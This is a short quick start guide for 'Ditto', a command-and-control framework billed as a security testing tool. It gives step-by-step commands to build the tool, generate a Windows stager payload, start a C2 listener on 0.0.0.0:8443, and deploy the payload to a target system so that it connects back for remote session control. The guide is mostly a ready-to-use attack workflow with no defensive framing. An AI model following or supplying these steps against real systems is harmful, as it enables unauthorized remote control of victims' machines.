# Quick Start Guide - Ditto

**Ditto** - Advanced Security Testing Framework

---

## Quick Start

### 1. Build Ditto

```bash
git clone https://github.com/rxid09672/ditto.git
cd ditto
make build
```

### 2. Run Interactive Mode

```bash
./bin/ditto
```

You'll see the ditto.png banner and an interactive prompt:

```
[ditto] > 
```

### 3. Generate Your First Payload

```bash
[ditto] > generate stager windows amd64 payload.exe
```

### 4. Start Server

```bash
[ditto] > server 0.0.0.0:8443
```

### 5. Deploy Payload

Deploy `payload.exe` to your target system. It will connect back to your server.

---

## Complete Workflow

1. **Generate payload**: `generate stager windows amd64 payload.exe`
2. **Start server**: `server 0.0.0.0:8443`
3. **Deploy payload**: Copy payload.exe to target
4. **Interact**: Use server interface to control sessions

---

## Command Reference

| Command | Description |
|---------|-------------|
| `generate <type> <os> <arch> [output]` | Generate payload |
| `server [address]` | Start C2 server |
| `client <url>` | Connect as client |
| `help` | Show help |
| `version` | Show version |
| `exit` | Exit Ditto |

---

For complete documentation, see [README.md](../README.md) and [docs/CLI_USAGE.md](CLI_USAGE.md).
